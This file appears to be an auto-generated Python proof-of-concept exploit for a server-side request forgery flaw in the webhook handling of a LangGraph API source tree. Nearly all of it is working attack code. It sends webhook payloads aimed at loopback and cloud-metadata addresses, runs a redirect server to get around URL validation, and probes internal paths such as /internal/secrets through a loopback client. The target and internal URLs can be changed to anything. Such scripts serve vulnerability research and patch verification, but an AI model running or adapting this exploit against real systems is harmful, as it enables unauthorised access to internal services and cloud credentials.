#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-008
# Sink: get_loopback_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_get_loopback_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via webhook URL in langgraph_api_src

Vulnerability Summary:
- The webhook URL is user-controlled and stored in result['webhook'].
- Although validate_webhook_url_or_raise() is called, the HTTP client (httpx.AsyncClient)
  follows redirects by default (follow_redirects=True).
- The validation may not block all internal IPs (e.g., 0.0.0.0, IPv6 loopback, cloud metadata IPs).
- Additionally, if the webhook starts with '/', the loopback client uses base_url='http://api',
  which could be exploited to access internal endpoints.

This PoC demonstrates:
1. Direct SSRF to an internal service (e.g., cloud metadata endpoint)
2. Redirect-based SSRF bypass (attacker-controlled server redirects to internal IP)
3. Loopback client abuse via leading '/' to access internal API endpoints

Usage:
    python3 poc_ssrf.py [--target TARGET_URL] [--mode MODE]

Modes:
    direct      - Attempt direct request to internal IP (e.g., 169.254.169.254)
    redirect    - Use attacker-controlled redirect server to bypass validation
    loopback    - Exploit loopback client with leading '/' to access internal API

Safe by default: Uses benign internal endpoints (e.g., http://127.0.0.1:1/ which will fail safely)
"""

import argparse
import sys
import socket
import urllib.parse
import http.server
import threading
import time
import json

# Try to use requests if available, otherwise fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False


# ─── Configuration ───────────────────────────────────────────────────────────
# Default target (change to actual langgraph API endpoint)
DEFAULT_TARGET = "http://localhost:8000/webhook/call"

# Internal endpoints to test (safe, will fail gracefully)
INTERNAL_TEST_ENDPOINTS = [
    "http://127.0.0.1:1/",           # Will fail - no service on port 1
    "http://0.0.0.0:1/",             # Will fail - no service on port 1
    "http://[::1]:1/",               # IPv6 loopback - will fail
    "http://169.254.169.254:1/",     # Cloud metadata IP (safe port)
]

# Attacker-controlled redirect server (change to your server if needed)
REDIRECT_SERVER_HOST = "0.0.0.0"
REDIRECT_SERVER_PORT = 9999


# ─── Helper Functions ────────────────────────────────────────────────────────

def make_request(url, method="POST", data=None, headers=None, allow_redirects=True, timeout=5):
    """Make HTTP request using available library."""
    if HAS_REQUESTS:
        try:
            if method.upper() == "GET":
                resp = requests.get(url, headers=headers, allow_redirects=allow_redirects, timeout=timeout)
            else:
                resp = requests.post(url, json=data, headers=headers, allow_redirects=allow_redirects, timeout=timeout)
            return resp.status_code, resp.text[:500] if resp.text else ""
        except requests.exceptions.RequestException as e:
            return None, str(e)
    else:
        try:
            req = urllib.request.Request(url, method=method)
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            if data is not None:
                req.data = json.dumps(data).encode()
            if not allow_redirects:
                class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
                    def redirect_request(self, req, fp, code, msg, headers, newurl):
                        return None
                opener = urllib.request.build_opener(NoRedirectHandler)
                resp = opener.open(req, timeout=timeout)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.getcode(), resp.read().decode()[:500]
        except urllib.error.HTTPError as e:
            return e.code, str(e)
        except urllib.error.URLError as e:
            return None, str(e)
        except Exception as e:
            return None, str(e)


def check_internal_ip(ip_str):
    """Check if an IP address is in private/internal ranges."""
    try:
        ip = ip_str.strip()
        # Handle IPv6
        if ip.startswith('['):
            ip = ip[1:-1]
        # Try to resolve hostname
        try:
            addr = socket.getaddrinfo(ip, 80)[0][4][0]
        except (socket.gaierror, IndexError):
            return False
        
        # Check RFC 1918 private ranges
        if addr.startswith('10.') or addr.startswith('172.16.') or addr.startswith('192.168.'):
            return True
        # Check loopback
        if addr == '127.0.0.1' or addr == '::1':
            return True
        # Check cloud metadata IP
        if addr == '169.254.169.254':
            return True
        # Check 0.0.0.0
        if addr == '0.0.0.0':
            return True
        return False
    except:
        return False


# ─── Redirect Server (for redirect-based SSRF) ──────────────────────────────

class RedirectHandler(http.server.BaseHTTPRequestHandler):
    """HTTP server that redirects to internal endpoints."""
    
    redirect_target = None
    
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', self.redirect_target)
        self.end_headers()
    
    def do_POST(self):
        self.send_response(302)
        self.send_header('Location', self.redirect_target)
        self.end_headers()
    
    def log_message(self, format, *args):
        print(f"[Redirect Server] {args[0]} {args[1]} {args[2]}")


def start_redirect_server(redirect_to):
    """Start a simple HTTP server that redirects to the given URL."""
    server = http.server.HTTPServer(
        (REDIRECT_SERVER_HOST, REDIRECT_SERVER_PORT),
        RedirectHandler
    )
    RedirectHandler.redirect_target = redirect_to
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server started on {REDIRECT_SERVER_HOST}:{REDIRECT_SERVER_PORT}")
    print(f"[*] Redirecting to: {redirect_to}")
    return server


# ─── Exploit Functions ───────────────────────────────────────────────────────

def exploit_direct(target_url, internal_url):
    """
    Attempt direct SSRF by sending a webhook pointing to an internal IP.
    This tests if the validation allows internal IPs directly.
    """
    print(f"\n{'='*60}")
    print(f"[*] Mode: Direct SSRF")
    print(f"[*] Target: {target_url}")
    print(f"[*] Internal URL: {internal_url}")
    print(f"{'='*60}")
    
    payload = {
        "webhook": internal_url,
        "run": {"run_id": "test-ssrf-direct"},
        "status": "completed",
        "checkpoint": None,
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:00:01",
    }
    
    print(f"[*] Sending webhook payload...")
    status, response = make_request(target_url, method="POST", data=payload)
    
    if status:
        print(f"[+] Response status: {status}")
        print(f"[+] Response body: {response}")
        if status < 400:
            print("[!] SUCCESS: Direct SSRF may be possible!")
            return True
        else:
            print("[-] Request failed (expected if validation works)")
    else:
        print(f"[-] Error: {response}")
    
    return False


def exploit_redirect(target_url, redirect_server_url, internal_url):
    """
    Attempt SSRF via redirect bypass.
    The initial webhook points to attacker's server, which redirects to internal IP.
    """
    print(f"\n{'='*60}")
    print(f"[*] Mode: Redirect-based SSRF")
    print(f"[*] Target: {target_url}")
    print(f"[*] Redirect server: {redirect_server_url}")
    print(f"[*] Redirect target: {internal_url}")
    print(f"{'='*60}")
    
    # Start redirect server
    server = start_redirect_server(internal_url)
    time.sleep(0.5)  # Give server time to start
    
    payload = {
        "webhook": redirect_server_url,
        "run": {"run_id": "test-ssrf-redirect"},
        "status": "completed",
        "checkpoint": None,
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:01:00",
    }
    
    print(f"[*] Sending webhook payload (will be redirected)...")
    status, response = make_request(target_url, method="POST", data=payload)
    
    # Stop redirect server
    server.shutdown()
    
    if status:
        print(f"[+] Response status: {status}")
        print(f"[+] Response body: {response}")
        if status < 400:
            print("[!] SUCCESS: Redirect-based SSRF may be possible!")
            return True
        else:
            print("[-] Request failed (expected if redirects are blocked)")
    else:
        print(f"[-] Error: {response}")
    
    return False


def exploit_loopback(target_url, internal_path):
    """
    Attempt SSRF via loopback client abuse.
    If webhook starts with '/', the loopback client uses base_url='http://api'.
    This could allow access to internal API endpoints.
    """
    print(f"\n{'='*60}")
    print(f"[*] Mode: Loopback client abuse")
    print(f"[*] Target: {target_url}")
    print(f"[*] Internal path: {internal_path}")
    print(f"{'='*60}")
    
    # The webhook starts with '/' to trigger loopback client
    webhook_url = internal_path  # e.g., "/internal/admin"
    
    payload = {
        "webhook": webhook_url,
        "run": {"run_id": "test-ssrf-loopback"},
        "status": "completed",
        "checkpoint": None,
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:02:00",
    }
    
    print(f"[*] Sending webhook payload with leading '/'...")
    status, response = make_request(target_url, method="POST", data=payload)
    
    if status:
        print(f"[+] Response status: {status}")
        print(f"[+] Response body: {response}")
        if status < 400:
            print("[!] SUCCESS: Loopback client abuse may be possible!")
            return True
        else:
            print("[-] Request failed (expected if loopback is restricted)")
    else:
        print(f"[-] Error: {response}")
    
    return False


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SSRF PoC for langgraph_api_src")
    parser.add_argument("--target", default=DEFAULT_TARGET,
                        help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--mode", choices=["direct", "redirect", "loopback", "all"],
                        default="all", help="Exploit mode (default: all)")
    parser.add_argument("--internal-url", default=None,
                        help="Internal URL to target (default: test endpoints)")
    parser.add_argument("--redirect-server", default=None,
                        help="Attacker redirect server URL (default: auto)")
    args = parser.parse_args()
    
    print("[*] SSRF Proof-of-Concept for langgraph_api_src")
    print(f"[*] Target: {args.target}")
    print(f"[*] Mode: {args.mode}")
    
    # Determine internal URLs to test
    if args.internal_url:
        internal_urls = [args.internal_url]
    else:
        internal_urls = INTERNAL_TEST_ENDPOINTS
    
    # Determine redirect server URL
    if args.redirect_server:
        redirect_server_url = args.redirect_server
    else:
        redirect_server_url = f"http://{REDIRECT_SERVER_HOST}:{REDIRECT_SERVER_PORT}"
    
    success = False
    
    if args.mode in ("direct", "all"):
        for internal_url in internal_urls:
            if exploit_direct(args.target, internal_url):
                success = True
                break
    
    if args.mode in ("redirect", "all"):
        for internal_url in internal_urls:
            if exploit_redirect(args.target, redirect_server_url, internal_url):
                success = True
                break
    
    if args.mode in ("loopback", "all"):
        # Test common internal API paths
        internal_paths = [
            "/internal/admin",
            "/internal/config",
            "/internal/secrets",
            "/health",
            "/metrics",
            "/debug",
        ]
        for path in internal_paths:
            if exploit_loopback(args.target, path):
                success = True
                break
    
    if success:
        print("\n[!] VULNERABLE: SSRF exploit succeeded!")
        print("[!] This confirms the vulnerability is exploitable.")
        sys.exit(0)
    else:
        print("\n[-] No successful exploit (may be patched or different configuration)")
        print("[*] Note: This PoC uses safe internal endpoints that will fail gracefully.")
        print("[*] In a real attack, an attacker would target actual internal services.")
        sys.exit(1)


if __name__ == "__main__":
    main()
